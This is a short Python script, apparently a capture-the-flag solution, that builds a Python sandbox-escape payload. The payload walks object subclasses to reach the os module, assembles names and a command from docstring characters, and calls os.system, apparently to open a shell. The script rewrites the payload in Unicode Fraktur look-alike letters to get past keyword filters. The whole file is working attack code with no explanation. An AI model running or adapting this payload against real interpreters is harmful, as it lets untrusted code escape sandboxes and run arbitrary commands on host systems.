import string

fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
real_alphabet = string.ascii_lowercase
trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))

payload = "[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8].modules[().__doc__[34]+().__doc__[19]].system([].__doc__[17]+[].__doc__[54])".translate(
    trans
)

print(payload)
